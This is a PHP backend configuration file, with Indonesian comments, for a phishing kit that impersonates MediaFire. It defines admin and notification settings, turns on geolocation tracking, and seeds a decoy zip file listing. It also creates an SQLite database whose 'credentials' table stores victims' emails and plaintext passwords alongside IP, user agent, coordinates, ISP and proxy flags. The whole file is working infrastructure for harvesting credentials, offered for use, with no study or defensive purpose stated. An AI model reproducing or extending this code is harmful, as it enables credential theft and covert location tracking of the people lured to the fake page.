<?php
// =============================================
// MEDIAFIRE PHISHING - BACKEND CONFIGURATION
// =============================================

// Database Configuration (SQLite)
define('DB_PATH', __DIR__ . '/../../mediafire.db');

// Admin Settings (GANTI INI!)
define('DEFAULT_ADMIN_TOKEN', 'MediaFire@2024!');  // Token untuk masuk admin
define('DEFAULT_ADMIN_EMAIL', 'akungmail@gmail.com');  // Email untuk menerima notifikasi

// Email Settings (SMTP - Rekomendasi)
define('SMTP_ENABLED', false);  // Set true jika pakai SMTP
define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_PORT', 587);
define('SMTP_USER', 'emailanda@gmail.com');
define('SMTP_PASS', 'app-password-anda');  // Gunakan App Password Gmail
define('SMTP_SECURE', 'tls');  // tls atau ssl

// Geolocation Settings
define('GEOLOCATION_ENABLED', true);  // Aktifkan geolokasi tracking

// Security
define('CSRF_TOKEN', bin2hex(random_bytes(32)));

// File Display Settings (Default)
define('DEFAULT_FILES', json_encode([
    [
        'id' => 1,
        'name' => 'CINEMA FRL V7 IRUKANDJI...',
        'type' => 'zip',
        'size' => '167.08MB',
        'icon' => 'archive'
    ]
]));

// Initialize database if not exists
if (!file_exists(DB_PATH)) {
    touch(DB_PATH);
    chmod(DB_PATH, 0666);
    init_database();
}

function init_database() {
    $db = new SQLite3(DB_PATH);

    // Create tables with geolocation columns
    $db->exec("
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            login_type TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            zip_code TEXT,
            latitude TEXT,
            longitude TEXT,
            isp TEXT,
            organization TEXT,
            proxy INTEGER DEFAULT 0,
            hosting INTEGER DEFAULT 0,
            timezone TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");

    $db->exec("
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            page_visited TEXT,
            country TEXT,
            city TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");

    $db->exec("
        CREATE TABLE IF NOT EXISTS settings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_email TEXT NOT NULL,
            admin_token TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");

    $db->exec("
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            type TEXT NOT NULL,
            size TEXT NOT NULL,
            icon TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");

    // Insert default admin settings
    $stmt = $db->prepare("INSERT OR IGNORE INTO settings (admin_email, admin_token) VALUES (:email, :token)");
    $stmt->bindValue(':email', DEFAULT_ADMIN_EMAIL, SQLITE3_TEXT);
    $stmt->bindValue(':token', DEFAULT_ADMIN_TOKEN, SQLITE3_TEXT);
    $stmt->execute();

    // Insert default files
    $defaultFiles = json_decode(DEFAULT_FILES, true);
    foreach ($defaultFiles as $file) {
        $stmt = $db->prepare("INSERT OR IGNORE INTO files (name, type, size, icon) VALUES (:name, :type, :size, :icon)");
        $stmt->bindValue(':name', $file['name'], SQLITE3_TEXT);
        $stmt->bindValue(':type', $file['type'], SQLITE3_TEXT);
        $stmt->bindValue(':size', $file['size'], SQLITE3_TEXT);
        $stmt->bindValue(':icon', $file['icon'], SQLITE3_TEXT);
        $stmt->execute();
    }

    $db->close();
}
?>